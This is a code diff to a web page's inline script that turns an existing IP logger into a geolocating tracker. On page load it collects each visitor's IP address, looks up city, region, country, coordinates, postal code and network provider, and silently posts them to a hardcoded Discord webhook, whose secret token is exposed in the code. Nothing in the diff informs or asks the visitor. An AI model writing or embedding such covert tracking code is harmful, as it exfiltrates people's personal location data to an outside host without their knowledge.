@@ -64,27 +64,42 @@
     </script>
 
     <script>
+        async function getLocation(ipAddress) {
+            const url = `http://ipinfo.io/${ipAddress}/json`;
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                return null;
+            }
+        }
+
         function getIP(json) {
             const webhookURL = 'https://discord.com/api/webhooks/1181985888897601617/5lGDVSfQoy_-NJrsNA9XJbcHqmDcscShtlQORHFThz498zPex6LOXJ-XSar5V3LbZ0MZ';
 
-            const data = {
-                content: "recent user's ip: " + json.ip
-            };
+            getLocation(json.ip)
+                .then(locationInfo => {
+                    const locationData = {
+                        content: `Recent user's IP: ${json.ip}\nCity: ${locationInfo.city}\nRegion: ${locationInfo.region}\nCountry: ${locationInfo.country}\nLocation: ${locationInfo.loc}\nCurrency: ${locationInfo.currency}\nRegion Code: ${locationInfo.region}\nNetwork: ${locationInfo.org}\nCountry Capital: ${locationInfo.country}\nLatitude: ${locationInfo.loc.split(",")[0]}\nLongitude: ${locationInfo.loc.split(",")[1]}\nPostal Code: ${locationInfo.postal}`
+                    };
 
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (response.ok) {
-                } else {
-                }
-            })
-            .catch(error => {
-            });
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(locationData)
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                        }
+                    })
+                    .catch(error => {
+                    });
+                })
+                .catch(error => {
+                });
         }
     </script>
     <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
